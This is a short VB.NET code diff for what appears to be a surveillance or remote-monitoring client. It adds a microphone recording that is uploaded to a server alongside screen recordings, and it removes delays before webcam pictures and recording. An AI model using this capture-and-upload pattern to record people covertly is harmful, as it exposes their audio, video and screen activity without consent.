@@ -51,6 +51,9 @@ Public Class Main
             If isScreenRecording Then
                 UploadFileToServer(SaveScreenRecord())
             End If
+            If isMicRecording Then
+                UploadFileToServer(SaveMicRecord())
+            End If
         Catch ex As Exception
             AddToLog("SessionEvent@Init", "Error: " & ex.Message, True)
         End Try
@@ -109,7 +112,6 @@ Public Class Main
     End Sub
     Function TakeCamPicture() As String
         Try
-            Threading.Thread.Sleep(5000)
             Dim filePath As String = DIRHome & "\usr" & UID & "_" & DateTime.Now.ToString("hhmmssddMMyyyy") & "_CamPicture.png"
             Dim Imagen = BMP
             Imagen.Save(filePath, ImageFormat.Png)
@@ -121,7 +123,6 @@ Public Class Main
     End Function
     Function StartCamRecord() As String
         Try
-            Threading.Thread.Sleep(5000)
             If Not isWebCamRecording Then
                 'videoFilePath = DIRHome & "\usr" & UID & "_" & DateTime.Now.ToString("hhmmssddMMyyyy") & "_CamVideo.avi"
                 'VideoWriter.Open(videoFilePath, Camarita.VideoResolution.FrameSize.Width, Camarita.VideoResolution.FrameSize.Height, 25, VideoCodec.Default, 300 * 1000)
